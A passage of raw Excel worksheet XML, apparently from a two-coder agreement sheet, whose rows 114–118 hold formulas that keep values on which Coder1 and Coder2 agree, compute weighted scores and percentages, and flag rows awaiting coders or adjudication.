        <f>IF(AND(Coder1!AC114&amp;""&lt;&gt;"",Coder1!AC114&amp;""=Coder2!AC114&amp;""),Coder1!AC114,"")</f>
        <v/>
      </c>
      <c r="AD114" s="14">
        <f>IF(AND(Coder1!AD114&amp;""&lt;&gt;"",Coder1!AD114&amp;""=Coder2!AD114&amp;""),Coder1!AD114,"")</f>
        <v/>
      </c>
      <c r="AE114" s="14">
        <f>IF(AND(Coder1!AE114&amp;""&lt;&gt;"",Coder1!AE114&amp;""=Coder2!AE114&amp;""),Coder1!AE114,"")</f>
        <v/>
      </c>
      <c r="AF114" s="14">
        <f>IF(AND(Coder1!AF114&amp;""&lt;&gt;"",Coder1!AF114&amp;""=Coder2!AF114&amp;""),Coder1!AF114,"")</f>
        <v/>
      </c>
      <c r="AG114" s="14">
        <f>IF(AND(Coder1!AG114&amp;""&lt;&gt;"",Coder1!AG114&amp;""=Coder2!AG114&amp;""),Coder1!AG114,"")</f>
        <v/>
      </c>
      <c r="AH114" s="14">
        <f>IF(AND(Coder1!AH114&amp;""&lt;&gt;"",Coder1!AH114&amp;""=Coder2!AH114&amp;""),Coder1!AH114,"")</f>
        <v/>
      </c>
      <c r="AI114" s="11">
        <f>IF(COUNT(E114:L114)=0,"",SUM(E114:L114))</f>
        <v/>
      </c>
      <c r="AJ114" s="11">
        <f>IF(AI114="","",N(E114)*3+N(F114)*2+N(G114)*2+N(H114)*2+N(I114)*2+N(J114)*3+N(K114)*3+N(L114)*3)</f>
        <v/>
      </c>
      <c r="AK114" s="11">
        <f>IF(AI114="","",COUNTIF(N114:AG114,1))</f>
        <v/>
      </c>
      <c r="AL114" s="11">
        <f>IF(OR(AJ114="",AJ114=0),"",ROUND(100*(AJ114-AK114)/AJ114,1))</f>
        <v/>
      </c>
      <c r="AM114" s="11">
        <f>IF(AND(Coder1!AN114=1,Coder2!AN114=1),IF(COUNTBLANK(E114:AH114)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN114" s="11">
        <f>IF(AND(Coder1!AN114=1,Coder2!AN114=1),IF(SUMPRODUCT(--(Coder1!E114:AH114&amp;""&lt;&gt;Coder2!E114:AH114&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO114" s="11" t="n"/>
    </row>
    <row r="115">
      <c r="A115" s="11">
        <f>Coder1!A115</f>
        <v/>
      </c>
      <c r="B115" s="11">
        <f>Coder1!B115</f>
        <v/>
      </c>
      <c r="C115" s="11">
        <f>Coder1!C115</f>
        <v/>
      </c>
      <c r="D115" s="11">
        <f>Coder1!D115</f>
        <v/>
      </c>
      <c r="E115" s="14">
        <f>IF(AND(Coder1!E115&amp;""&lt;&gt;"",Coder1!E115&amp;""=Coder2!E115&amp;""),Coder1!E115,"")</f>
        <v/>
      </c>
      <c r="F115" s="14">
        <f>IF(AND(Coder1!F115&amp;""&lt;&gt;"",Coder1!F115&amp;""=Coder2!F115&amp;""),Coder1!F115,"")</f>
        <v/>
      </c>
      <c r="G115" s="14">
        <f>IF(AND(Coder1!G115&amp;""&lt;&gt;"",Coder1!G115&amp;""=Coder2!G115&amp;""),Coder1!G115,"")</f>
        <v/>
      </c>
      <c r="H115" s="14">
        <f>IF(AND(Coder1!H115&amp;""&lt;&gt;"",Coder1!H115&amp;""=Coder2!H115&amp;""),Coder1!H115,"")</f>
        <v/>
      </c>
      <c r="I115" s="14">
        <f>IF(AND(Coder1!I115&amp;""&lt;&gt;"",Coder1!I115&amp;""=Coder2!I115&amp;""),Coder1!I115,"")</f>
        <v/>
      </c>
      <c r="J115" s="14">
        <f>IF(AND(Coder1!J115&amp;""&lt;&gt;"",Coder1!J115&amp;""=Coder2!J115&amp;""),Coder1!J115,"")</f>
        <v/>
      </c>
      <c r="K115" s="14">
        <f>IF(AND(Coder1!K115&amp;""&lt;&gt;"",Coder1!K115&amp;""=Coder2!K115&amp;""),Coder1!K115,"")</f>
        <v/>
      </c>
      <c r="L115" s="14">
        <f>IF(AND(Coder1!L115&amp;""&lt;&gt;"",Coder1!L115&amp;""=Coder2!L115&amp;""),Coder1!L115,"")</f>
        <v/>
      </c>
      <c r="M115" s="14">
        <f>IF(AND(Coder1!M115&amp;""&lt;&gt;"",Coder1!M115&amp;""=Coder2!M115&amp;""),Coder1!M115,"")</f>
        <v/>
      </c>
      <c r="N115" s="14">
        <f>IF(AND(Coder1!N115&amp;""&lt;&gt;"",Coder1!N115&amp;""=Coder2!N115&amp;""),Coder1!N115,"")</f>
        <v/>
      </c>
      <c r="O115" s="14">
        <f>IF(AND(Coder1!O115&amp;""&lt;&gt;"",Coder1!O115&amp;""=Coder2!O115&amp;""),Coder1!O115,"")</f>
        <v/>
      </c>
      <c r="P115" s="14">
        <f>IF(AND(Coder1!P115&amp;""&lt;&gt;"",Coder1!P115&amp;""=Coder2!P115&amp;""),Coder1!P115,"")</f>
        <v/>
      </c>
      <c r="Q115" s="14">
        <f>IF(AND(Coder1!Q115&amp;""&lt;&gt;"",Coder1!Q115&amp;""=Coder2!Q115&amp;""),Coder1!Q115,"")</f>
        <v/>
      </c>
      <c r="R115" s="14">
        <f>IF(AND(Coder1!R115&amp;""&lt;&gt;"",Coder1!R115&amp;""=Coder2!R115&amp;""),Coder1!R115,"")</f>
        <v/>
      </c>
      <c r="S115" s="14">
        <f>IF(AND(Coder1!S115&amp;""&lt;&gt;"",Coder1!S115&amp;""=Coder2!S115&amp;""),Coder1!S115,"")</f>
        <v/>
      </c>
      <c r="T115" s="14">
        <f>IF(AND(Coder1!T115&amp;""&lt;&gt;"",Coder1!T115&amp;""=Coder2!T115&amp;""),Coder1!T115,"")</f>
        <v/>
      </c>
      <c r="U115" s="14">
        <f>IF(AND(Coder1!U115&amp;""&lt;&gt;"",Coder1!U115&amp;""=Coder2!U115&amp;""),Coder1!U115,"")</f>
        <v/>
      </c>
      <c r="V115" s="14">
        <f>IF(AND(Coder1!V115&amp;""&lt;&gt;"",Coder1!V115&amp;""=Coder2!V115&amp;""),Coder1!V115,"")</f>
        <v/>
      </c>
      <c r="W115" s="14">
        <f>IF(AND(Coder1!W115&amp;""&lt;&gt;"",Coder1!W115&amp;""=Coder2!W115&amp;""),Coder1!W115,"")</f>
        <v/>
      </c>
      <c r="X115" s="14">
        <f>IF(AND(Coder1!X115&amp;""&lt;&gt;"",Coder1!X115&amp;""=Coder2!X115&amp;""),Coder1!X115,"")</f>
        <v/>
      </c>
      <c r="Y115" s="14">
        <f>IF(AND(Coder1!Y115&amp;""&lt;&gt;"",Coder1!Y115&amp;""=Coder2!Y115&amp;""),Coder1!Y115,"")</f>
        <v/>
      </c>
      <c r="Z115" s="14">
        <f>IF(AND(Coder1!Z115&amp;""&lt;&gt;"",Coder1!Z115&amp;""=Coder2!Z115&amp;""),Coder1!Z115,"")</f>
        <v/>
      </c>
      <c r="AA115" s="14">
        <f>IF(AND(Coder1!AA115&amp;""&lt;&gt;"",Coder1!AA115&amp;""=Coder2!AA115&amp;""),Coder1!AA115,"")</f>
        <v/>
      </c>
      <c r="AB115" s="14">
        <f>IF(AND(Coder1!AB115&amp;""&lt;&gt;"",Coder1!AB115&amp;""=Coder2!AB115&amp;""),Coder1!AB115,"")</f>
        <v/>
      </c>
      <c r="AC115" s="14">
        <f>IF(AND(Coder1!AC115&amp;""&lt;&gt;"",Coder1!AC115&amp;""=Coder2!AC115&amp;""),Coder1!AC115,"")</f>
        <v/>
      </c>
      <c r="AD115" s="14">
        <f>IF(AND(Coder1!AD115&amp;""&lt;&gt;"",Coder1!AD115&amp;""=Coder2!AD115&amp;""),Coder1!AD115,"")</f>
        <v/>
      </c>
      <c r="AE115" s="14">
        <f>IF(AND(Coder1!AE115&amp;""&lt;&gt;"",Coder1!AE115&amp;""=Coder2!AE115&amp;""),Coder1!AE115,"")</f>
        <v/>
      </c>
      <c r="AF115" s="14">
        <f>IF(AND(Coder1!AF115&amp;""&lt;&gt;"",Coder1!AF115&amp;""=Coder2!AF115&amp;""),Coder1!AF115,"")</f>
        <v/>
      </c>
      <c r="AG115" s="14">
        <f>IF(AND(Coder1!AG115&amp;""&lt;&gt;"",Coder1!AG115&amp;""=Coder2!AG115&amp;""),Coder1!AG115,"")</f>
        <v/>
      </c>
      <c r="AH115" s="14">
        <f>IF(AND(Coder1!AH115&amp;""&lt;&gt;"",Coder1!AH115&amp;""=Coder2!AH115&amp;""),Coder1!AH115,"")</f>
        <v/>
      </c>
      <c r="AI115" s="11">
        <f>IF(COUNT(E115:L115)=0,"",SUM(E115:L115))</f>
        <v/>
      </c>
      <c r="AJ115" s="11">
        <f>IF(AI115="","",N(E115)*3+N(F115)*2+N(G115)*2+N(H115)*2+N(I115)*2+N(J115)*3+N(K115)*3+N(L115)*3)</f>
        <v/>
      </c>
      <c r="AK115" s="11">
        <f>IF(AI115="","",COUNTIF(N115:AG115,1))</f>
        <v/>
      </c>
      <c r="AL115" s="11">
        <f>IF(OR(AJ115="",AJ115=0),"",ROUND(100*(AJ115-AK115)/AJ115,1))</f>
        <v/>
      </c>
      <c r="AM115" s="11">
        <f>IF(AND(Coder1!AN115=1,Coder2!AN115=1),IF(COUNTBLANK(E115:AH115)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN115" s="11">
        <f>IF(AND(Coder1!AN115=1,Coder2!AN115=1),IF(SUMPRODUCT(--(Coder1!E115:AH115&amp;""&lt;&gt;Coder2!E115:AH115&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO115" s="11" t="n"/>
    </row>
    <row r="116">
      <c r="A116" s="11">
        <f>Coder1!A116</f>
        <v/>
      </c>
      <c r="B116" s="11">
        <f>Coder1!B116</f>
        <v/>
      </c>
      <c r="C116" s="11">
        <f>Coder1!C116</f>
        <v/>
      </c>
      <c r="D116" s="11">
        <f>Coder1!D116</f>
        <v/>
      </c>
      <c r="E116" s="14">
        <f>IF(AND(Coder1!E116&amp;""&lt;&gt;"",Coder1!E116&amp;""=Coder2!E116&amp;""),Coder1!E116,"")</f>
        <v/>
      </c>
      <c r="F116" s="14">
        <f>IF(AND(Coder1!F116&amp;""&lt;&gt;"",Coder1!F116&amp;""=Coder2!F116&amp;""),Coder1!F116,"")</f>
        <v/>
      </c>
      <c r="G116" s="14">
        <f>IF(AND(Coder1!G116&amp;""&lt;&gt;"",Coder1!G116&amp;""=Coder2!G116&amp;""),Coder1!G116,"")</f>
        <v/>
      </c>
      <c r="H116" s="14">
        <f>IF(AND(Coder1!H116&amp;""&lt;&gt;"",Coder1!H116&amp;""=Coder2!H116&amp;""),Coder1!H116,"")</f>
        <v/>
      </c>
      <c r="I116" s="14">
        <f>IF(AND(Coder1!I116&amp;""&lt;&gt;"",Coder1!I116&amp;""=Coder2!I116&amp;""),Coder1!I116,"")</f>
        <v/>
      </c>
      <c r="J116" s="14">
        <f>IF(AND(Coder1!J116&amp;""&lt;&gt;"",Coder1!J116&amp;""=Coder2!J116&amp;""),Coder1!J116,"")</f>
        <v/>
      </c>
      <c r="K116" s="14">
        <f>IF(AND(Coder1!K116&amp;""&lt;&gt;"",Coder1!K116&amp;""=Coder2!K116&amp;""),Coder1!K116,"")</f>
        <v/>
      </c>
      <c r="L116" s="14">
        <f>IF(AND(Coder1!L116&amp;""&lt;&gt;"",Coder1!L116&amp;""=Coder2!L116&amp;""),Coder1!L116,"")</f>
        <v/>
      </c>
      <c r="M116" s="14">
        <f>IF(AND(Coder1!M116&amp;""&lt;&gt;"",Coder1!M116&amp;""=Coder2!M116&amp;""),Coder1!M116,"")</f>
        <v/>
      </c>
      <c r="N116" s="14">
        <f>IF(AND(Coder1!N116&amp;""&lt;&gt;"",Coder1!N116&amp;""=Coder2!N116&amp;""),Coder1!N116,"")</f>
        <v/>
      </c>
      <c r="O116" s="14">
        <f>IF(AND(Coder1!O116&amp;""&lt;&gt;"",Coder1!O116&amp;""=Coder2!O116&amp;""),Coder1!O116,"")</f>
        <v/>
      </c>
      <c r="P116" s="14">
        <f>IF(AND(Coder1!P116&amp;""&lt;&gt;"",Coder1!P116&amp;""=Coder2!P116&amp;""),Coder1!P116,"")</f>
        <v/>
      </c>
      <c r="Q116" s="14">
        <f>IF(AND(Coder1!Q116&amp;""&lt;&gt;"",Coder1!Q116&amp;""=Coder2!Q116&amp;""),Coder1!Q116,"")</f>
        <v/>
      </c>
      <c r="R116" s="14">
        <f>IF(AND(Coder1!R116&amp;""&lt;&gt;"",Coder1!R116&amp;""=Coder2!R116&amp;""),Coder1!R116,"")</f>
        <v/>
      </c>
      <c r="S116" s="14">
        <f>IF(AND(Coder1!S116&amp;""&lt;&gt;"",Coder1!S116&amp;""=Coder2!S116&amp;""),Coder1!S116,"")</f>
        <v/>
      </c>
      <c r="T116" s="14">
        <f>IF(AND(Coder1!T116&amp;""&lt;&gt;"",Coder1!T116&amp;""=Coder2!T116&amp;""),Coder1!T116,"")</f>
        <v/>
      </c>
      <c r="U116" s="14">
        <f>IF(AND(Coder1!U116&amp;""&lt;&gt;"",Coder1!U116&amp;""=Coder2!U116&amp;""),Coder1!U116,"")</f>
        <v/>
      </c>
      <c r="V116" s="14">
        <f>IF(AND(Coder1!V116&amp;""&lt;&gt;"",Coder1!V116&amp;""=Coder2!V116&amp;""),Coder1!V116,"")</f>
        <v/>
      </c>
      <c r="W116" s="14">
        <f>IF(AND(Coder1!W116&amp;""&lt;&gt;"",Coder1!W116&amp;""=Coder2!W116&amp;""),Coder1!W116,"")</f>
        <v/>
      </c>
      <c r="X116" s="14">
        <f>IF(AND(Coder1!X116&amp;""&lt;&gt;"",Coder1!X116&amp;""=Coder2!X116&amp;""),Coder1!X116,"")</f>
        <v/>
      </c>
      <c r="Y116" s="14">
        <f>IF(AND(Coder1!Y116&amp;""&lt;&gt;"",Coder1!Y116&amp;""=Coder2!Y116&amp;""),Coder1!Y116,"")</f>
        <v/>
      </c>
      <c r="Z116" s="14">
        <f>IF(AND(Coder1!Z116&amp;""&lt;&gt;"",Coder1!Z116&amp;""=Coder2!Z116&amp;""),Coder1!Z116,"")</f>
        <v/>
      </c>
      <c r="AA116" s="14">
        <f>IF(AND(Coder1!AA116&amp;""&lt;&gt;"",Coder1!AA116&amp;""=Coder2!AA116&amp;""),Coder1!AA116,"")</f>
        <v/>
      </c>
      <c r="AB116" s="14">
        <f>IF(AND(Coder1!AB116&amp;""&lt;&gt;"",Coder1!AB116&amp;""=Coder2!AB116&amp;""),Coder1!AB116,"")</f>
        <v/>
      </c>
      <c r="AC116" s="14">
        <f>IF(AND(Coder1!AC116&amp;""&lt;&gt;"",Coder1!AC116&amp;""=Coder2!AC116&amp;""),Coder1!AC116,"")</f>
        <v/>
      </c>
      <c r="AD116" s="14">
        <f>IF(AND(Coder1!AD116&amp;""&lt;&gt;"",Coder1!AD116&amp;""=Coder2!AD116&amp;""),Coder1!AD116,"")</f>
        <v/>
      </c>
      <c r="AE116" s="14">
        <f>IF(AND(Coder1!AE116&amp;""&lt;&gt;"",Coder1!AE116&amp;""=Coder2!AE116&amp;""),Coder1!AE116,"")</f>
        <v/>
      </c>
      <c r="AF116" s="14">
        <f>IF(AND(Coder1!AF116&amp;""&lt;&gt;"",Coder1!AF116&amp;""=Coder2!AF116&amp;""),Coder1!AF116,"")</f>
        <v/>
      </c>
      <c r="AG116" s="14">
        <f>IF(AND(Coder1!AG116&amp;""&lt;&gt;"",Coder1!AG116&amp;""=Coder2!AG116&amp;""),Coder1!AG116,"")</f>
        <v/>
      </c>
      <c r="AH116" s="14">
        <f>IF(AND(Coder1!AH116&amp;""&lt;&gt;"",Coder1!AH116&amp;""=Coder2!AH116&amp;""),Coder1!AH116,"")</f>
        <v/>
      </c>
      <c r="AI116" s="11">
        <f>IF(COUNT(E116:L116)=0,"",SUM(E116:L116))</f>
        <v/>
      </c>
      <c r="AJ116" s="11">
        <f>IF(AI116="","",N(E116)*3+N(F116)*2+N(G116)*2+N(H116)*2+N(I116)*2+N(J116)*3+N(K116)*3+N(L116)*3)</f>
        <v/>
      </c>
      <c r="AK116" s="11">
        <f>IF(AI116="","",COUNTIF(N116:AG116,1))</f>
        <v/>
      </c>
      <c r="AL116" s="11">
        <f>IF(OR(AJ116="",AJ116=0),"",ROUND(100*(AJ116-AK116)/AJ116,1))</f>
        <v/>
      </c>
      <c r="AM116" s="11">
        <f>IF(AND(Coder1!AN116=1,Coder2!AN116=1),IF(COUNTBLANK(E116:AH116)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN116" s="11">
        <f>IF(AND(Coder1!AN116=1,Coder2!AN116=1),IF(SUMPRODUCT(--(Coder1!E116:AH116&amp;""&lt;&gt;Coder2!E116:AH116&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO116" s="11" t="n"/>
    </row>
    <row r="117">
      <c r="A117" s="11">
        <f>Coder1!A117</f>
        <v/>
      </c>
      <c r="B117" s="11">
        <f>Coder1!B117</f>
        <v/>
      </c>
      <c r="C117" s="11">
        <f>Coder1!C117</f>
        <v/>
      </c>
      <c r="D117" s="11">
        <f>Coder1!D117</f>
        <v/>
      </c>
      <c r="E117" s="14">
        <f>IF(AND(Coder1!E117&amp;""&lt;&gt;"",Coder1!E117&amp;""=Coder2!E117&amp;""),Coder1!E117,"")</f>
        <v/>
      </c>
      <c r="F117" s="14">
        <f>IF(AND(Coder1!F117&amp;""&lt;&gt;"",Coder1!F117&amp;""=Coder2!F117&amp;""),Coder1!F117,"")</f>
        <v/>
      </c>
      <c r="G117" s="14">
        <f>IF(AND(Coder1!G117&amp;""&lt;&gt;"",Coder1!G117&amp;""=Coder2!G117&amp;""),Coder1!G117,"")</f>
        <v/>
      </c>
      <c r="H117" s="14">
        <f>IF(AND(Coder1!H117&amp;""&lt;&gt;"",Coder1!H117&amp;""=Coder2!H117&amp;""),Coder1!H117,"")</f>
        <v/>
      </c>
      <c r="I117" s="14">
        <f>IF(AND(Coder1!I117&amp;""&lt;&gt;"",Coder1!I117&amp;""=Coder2!I117&amp;""),Coder1!I117,"")</f>
        <v/>
      </c>
      <c r="J117" s="14">
        <f>IF(AND(Coder1!J117&amp;""&lt;&gt;"",Coder1!J117&amp;""=Coder2!J117&amp;""),Coder1!J117,"")</f>
        <v/>
      </c>
      <c r="K117" s="14">
        <f>IF(AND(Coder1!K117&amp;""&lt;&gt;"",Coder1!K117&amp;""=Coder2!K117&amp;""),Coder1!K117,"")</f>
        <v/>
      </c>
      <c r="L117" s="14">
        <f>IF(AND(Coder1!L117&amp;""&lt;&gt;"",Coder1!L117&amp;""=Coder2!L117&amp;""),Coder1!L117,"")</f>
        <v/>
      </c>
      <c r="M117" s="14">
        <f>IF(AND(Coder1!M117&amp;""&lt;&gt;"",Coder1!M117&amp;""=Coder2!M117&amp;""),Coder1!M117,"")</f>
        <v/>
      </c>
      <c r="N117" s="14">
        <f>IF(AND(Coder1!N117&amp;""&lt;&gt;"",Coder1!N117&amp;""=Coder2!N117&amp;""),Coder1!N117,"")</f>
        <v/>
      </c>
      <c r="O117" s="14">
        <f>IF(AND(Coder1!O117&amp;""&lt;&gt;"",Coder1!O117&amp;""=Coder2!O117&amp;""),Coder1!O117,"")</f>
        <v/>
      </c>
      <c r="P117" s="14">
        <f>IF(AND(Coder1!P117&amp;""&lt;&gt;"",Coder1!P117&amp;""=Coder2!P117&amp;""),Coder1!P117,"")</f>
        <v/>
      </c>
      <c r="Q117" s="14">
        <f>IF(AND(Coder1!Q117&amp;""&lt;&gt;"",Coder1!Q117&amp;""=Coder2!Q117&amp;""),Coder1!Q117,"")</f>
        <v/>
      </c>
      <c r="R117" s="14">
        <f>IF(AND(Coder1!R117&amp;""&lt;&gt;"",Coder1!R117&amp;""=Coder2!R117&amp;""),Coder1!R117,"")</f>
        <v/>
      </c>
      <c r="S117" s="14">
        <f>IF(AND(Coder1!S117&amp;""&lt;&gt;"",Coder1!S117&amp;""=Coder2!S117&amp;""),Coder1!S117,"")</f>
        <v/>
      </c>
      <c r="T117" s="14">
        <f>IF(AND(Coder1!T117&amp;""&lt;&gt;"",Coder1!T117&amp;""=Coder2!T117&amp;""),Coder1!T117,"")</f>
        <v/>
      </c>
      <c r="U117" s="14">
        <f>IF(AND(Coder1!U117&amp;""&lt;&gt;"",Coder1!U117&amp;""=Coder2!U117&amp;""),Coder1!U117,"")</f>
        <v/>
      </c>
      <c r="V117" s="14">
        <f>IF(AND(Coder1!V117&amp;""&lt;&gt;"",Coder1!V117&amp;""=Coder2!V117&amp;""),Coder1!V117,"")</f>
        <v/>
      </c>
      <c r="W117" s="14">
        <f>IF(AND(Coder1!W117&amp;""&lt;&gt;"",Coder1!W117&amp;""=Coder2!W117&amp;""),Coder1!W117,"")</f>
        <v/>
      </c>
      <c r="X117" s="14">
        <f>IF(AND(Coder1!X117&amp;""&lt;&gt;"",Coder1!X117&amp;""=Coder2!X117&amp;""),Coder1!X117,"")</f>
        <v/>
      </c>
      <c r="Y117" s="14">
        <f>IF(AND(Coder1!Y117&amp;""&lt;&gt;"",Coder1!Y117&amp;""=Coder2!Y117&amp;""),Coder1!Y117,"")</f>
        <v/>
      </c>
      <c r="Z117" s="14">
        <f>IF(AND(Coder1!Z117&amp;""&lt;&gt;"",Coder1!Z117&amp;""=Coder2!Z117&amp;""),Coder1!Z117,"")</f>
        <v/>
      </c>
      <c r="AA117" s="14">
        <f>IF(AND(Coder1!AA117&amp;""&lt;&gt;"",Coder1!AA117&amp;""=Coder2!AA117&amp;""),Coder1!AA117,"")</f>
        <v/>
      </c>
      <c r="AB117" s="14">
        <f>IF(AND(Coder1!AB117&amp;""&lt;&gt;"",Coder1!AB117&amp;""=Coder2!AB117&amp;""),Coder1!AB117,"")</f>
        <v/>
      </c>
      <c r="AC117" s="14">
        <f>IF(AND(Coder1!AC117&amp;""&lt;&gt;"",Coder1!AC117&amp;""=Coder2!AC117&amp;""),Coder1!AC117,"")</f>
        <v/>
      </c>
      <c r="AD117" s="14">
        <f>IF(AND(Coder1!AD117&amp;""&lt;&gt;"",Coder1!AD117&amp;""=Coder2!AD117&amp;""),Coder1!AD117,"")</f>
        <v/>
      </c>
      <c r="AE117" s="14">
        <f>IF(AND(Coder1!AE117&amp;""&lt;&gt;"",Coder1!AE117&amp;""=Coder2!AE117&amp;""),Coder1!AE117,"")</f>
        <v/>
      </c>
      <c r="AF117" s="14">
        <f>IF(AND(Coder1!AF117&amp;""&lt;&gt;"",Coder1!AF117&amp;""=Coder2!AF117&amp;""),Coder1!AF117,"")</f>
        <v/>
      </c>
      <c r="AG117" s="14">
        <f>IF(AND(Coder1!AG117&amp;""&lt;&gt;"",Coder1!AG117&amp;""=Coder2!AG117&amp;""),Coder1!AG117,"")</f>
        <v/>
      </c>
      <c r="AH117" s="14">
        <f>IF(AND(Coder1!AH117&amp;""&lt;&gt;"",Coder1!AH117&amp;""=Coder2!AH117&amp;""),Coder1!AH117,"")</f>
        <v/>
      </c>
      <c r="AI117" s="11">
        <f>IF(COUNT(E117:L117)=0,"",SUM(E117:L117))</f>
        <v/>
      </c>
      <c r="AJ117" s="11">
        <f>IF(AI117="","",N(E117)*3+N(F117)*2+N(G117)*2+N(H117)*2+N(I117)*2+N(J117)*3+N(K117)*3+N(L117)*3)</f>
        <v/>
      </c>
      <c r="AK117" s="11">
        <f>IF(AI117="","",COUNTIF(N117:AG117,1))</f>
        <v/>
      </c>
      <c r="AL117" s="11">
        <f>IF(OR(AJ117="",AJ117=0),"",ROUND(100*(AJ117-AK117)/AJ117,1))</f>
        <v/>
      </c>
      <c r="AM117" s="11">
        <f>IF(AND(Coder1!AN117=1,Coder2!AN117=1),IF(COUNTBLANK(E117:AH117)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN117" s="11">
        <f>IF(AND(Coder1!AN117=1,Coder2!AN117=1),IF(SUMPRODUCT(--(Coder1!E117:AH117&amp;""&lt;&gt;Coder2!E117:AH117&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO117" s="11" t="n"/>
    </row>
    <row r="118">
      <c r="A118" s="11">
        <f>Coder1!A118</f>
        <v/>
      </c>
      <c r="B118" s="11">
        <f>Coder1!B118</f>
        <v/>
      </c>
      <c r="C118" s="11">
        <f>Coder1!C118</f>
        <v/>
      </c>
      <c r="D118" s="11">
        <f>Coder1!D118</f>
        <v/>
      </c>
      <c r="E118" s="14">
        <f>IF(AND(Coder1!E118&amp;""&lt;&gt;"",Coder1!E118&amp;""=Coder2!E118&amp;""),Coder1!E118,"")</f>
        <v/>
      </c>
      <c r="F118" s="14">
        <f>IF(AND(Coder1!F118&amp;""&lt;&gt;"",Coder1!F118&amp;""=Coder2!F118&amp;""),Coder1!F118,"")</f>
        <v/>
      </c>
      <c r="G118" s="14">
        <f>IF(AND(Coder1!G118&amp;""&lt;&gt;"",Coder1!G118&amp;""=Coder2!G118&amp;""),Coder1!G118,"")</f>
        <v/>
      </c>
      <c r="H118" s="14">
        <f>IF(AND(Coder1!H118&amp;""&lt;&gt;"",Coder1!H118&amp;""=Coder2!H118&amp;""),Coder1!H118,"")</f>
        <v/>
      </c>
      <c r="I118" s="14">
        <f>IF(AND(Coder1!I118&amp;""&lt;&gt;"",Coder1!I118&amp;""=Coder2!I118&amp;""),Coder1!I118,"")</f>
        <v/>
      </c>
      <c r="J118" s="14">
        <f>IF(AND(Coder1!J118&amp;""&lt;&gt;"",Coder1!J118&amp;""=Coder2!J118&amp;""),Coder1!J118,"")</f>
        <v/>
      </c>
      <c r="K118" s="14">
        <f>IF(AND(Coder1!K118&amp;""&lt;&gt;"",Coder1!K118&amp;""=Coder2!K118&amp;""),Coder1!K118,"")</f>
        <v/>
      </c>
      <c r="L118" s="14">
        <f>IF(AND(Coder1!L118&amp;""&lt;&gt;"",Coder1!L118&amp;""=Coder2!L118&amp;""),Coder1!L118,"")</f>
        <v/>
      </c>
      <c r="M118" s="14">
        <f>IF(AND(Coder1!M118&amp;""&lt;&gt;"",Coder1!M118&amp;""=Coder2!M118&amp;""),Coder1!M118,"")</f>
        <v/>
      </c>
      <c r="N118" s="14">
        <f>IF(AND(Coder1!N118&amp;""&lt;&gt;"",Coder1!N118&amp;""=Coder2!N118&amp;""),Coder1!N118,"")</f>
        <v/>
      </c>
      <c r="O118" s="14">
        <f>IF(AND(Coder1!O118&amp;""&lt;&gt;"",Coder1!O118&amp;""=Coder2!O118&amp;""),Coder1!O118,"")</f>
        <v/>
      </c>
      <c r="P118" s="14">
        <f>IF(AND(Coder1!P118&amp;""&lt;&gt;"",Coder1!P118&amp;""=Coder2!P118&amp;""),Coder1!P118,"")</f>
        <v/>
      </c>
      <c r="Q118" s="14">
        <f>IF(AND(Coder1!Q118&amp;""&lt;&gt;"",Coder1!Q118&amp;""=Coder2!Q118&amp;""),Coder1!Q118,"")</f>
        <v/>
      </c>
      <c r="R118" s="14">
        <f>IF(AND(Coder1!R118&amp;""&lt;&gt;"",Coder1!R118&amp;""=Coder2!R118&amp;""),Coder1!R118,"")</f>
        <v/>
      </c>
      <c r="S118" s="14">
        <f>IF(AND(Coder1!S118&amp;""&lt;&gt;"",Coder1!S118&amp;""=Coder2!S118&amp;""),Coder1!S118,"")</f>
        <v/>
      </c>
      <c r="T118" s="14">
        <f>IF(AND(Coder1!T118&amp;""&lt;&gt;"",Coder1!T118&amp;""=Coder2!T118&amp;""),Coder1!T118,"")</f>
        <v/>
      </c>
      <c r="U118" s="14">
        <f>IF(AND(Coder1!U118&amp;""&lt;&gt;"",Coder1!U118&amp;""=Coder2!U118&amp;""),Coder1!U118,"")</f>
        <v/>
      </c>
      <c r="V118" s="14">
        <f>IF(AND(Coder1!V118&amp;""&lt;&gt;"",Coder1!V118&amp;""=Coder2!V118&amp;""),Coder1!V118,"")</f>
        <v/>
      </c>
      <c r="W118" s="14">
        <f>IF(AND(Coder1!W118&amp;""&lt;&gt;"",Coder1!W118&amp;""=Coder2!W118&amp;""),Coder1!W118,"")</f>
        <v/>
      </c>
      <c r="X118" s="14">
        <f>IF(AND(Coder1!X118&amp;""&lt;&gt;"",Coder1!X118&amp;""=Coder2!X118&amp;""),Coder1!X118,"")</f>
        <v/>
      </c>
      <c r="Y118" s="14">
        <f>IF(AND(Coder1!Y118&amp;""&lt;&gt;"",Coder1!Y118&amp;""=Coder2!Y118&amp;""),Coder1!Y118,"")</f>
        <v/>
      </c>
      <c r="Z118" s="14">
        <f>IF(AND(Coder1!Z118&amp;""&lt;&gt;"",Coder1!Z118&amp;""=Coder2!Z118&amp;""),Coder1!Z118,"")</f>
        <v/>
      </c>
      <c r="AA118" s="14">
        <f>IF(AND(Coder1!AA118&amp;""&lt;&gt;"",Coder1!AA118&amp;""=Coder2!AA118&amp;""),Coder1!AA118,"")</f>
        <v/>
      </c>
      <c r="AB118" s="14">
        <f>IF(AND(Coder1!AB118&amp;""&lt;&gt;"",Coder1!AB118&amp;""=Coder2!AB118&amp;""),Coder1!AB118,"")</f>
        <v/>
      </c>
      <c r="AC118" s="14">
        <f>IF(AND(Coder1!AC118&amp;""&lt;&gt;"",Coder1!AC118&amp;""=Coder2!AC118&amp;""),Coder1!AC118,"")</f>
        <v/>
      </c>
      <c r="AD118" s="14">
        <f>IF(AND(Coder1!AD118&amp;""&lt;&gt;"",Coder1!AD118&amp;""=Coder2!AD118&amp;""),Coder1!AD118,"")</f>
        <v/>
      </c>
      <c r="AE118" s="14">
        <f>IF(AND(Coder1!AE118&amp;""&lt;&gt;"",Coder1!AE118&amp;""=Coder2!AE118&amp;""),Coder1!AE118,"")</f>
        <v/>
      </c>
      <c r="AF118" s="14">
